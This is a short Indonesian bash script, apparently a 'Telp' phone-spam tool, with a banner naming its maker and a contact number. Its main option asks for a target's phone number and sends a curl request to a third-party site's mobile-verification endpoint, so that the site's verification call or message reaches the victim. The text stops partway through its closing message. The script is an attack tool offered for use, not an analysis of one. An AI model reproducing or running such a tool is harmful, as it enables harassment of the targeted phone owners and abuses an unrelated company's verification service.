#!bin/bash
clear
echo "****************************"

echo "____________________________"
echo "PEMBUAT Uzii/Lasun ID,KONTAK 083100518970"
echo "____________________________"
echo "****************************"
figlet Telp | lolcat
echo "::::::::::::::::::::::::::::::"
echo '
[1], telepon spam
[2], keluar &kontak admin
'
echo "::::::::::::::::::::::::::::::"
echo
read -p "masukan pilihan kalian lurd : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan No Target contoh:89528100123  : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo "thanks ya lurd udah pakai tools Lasun
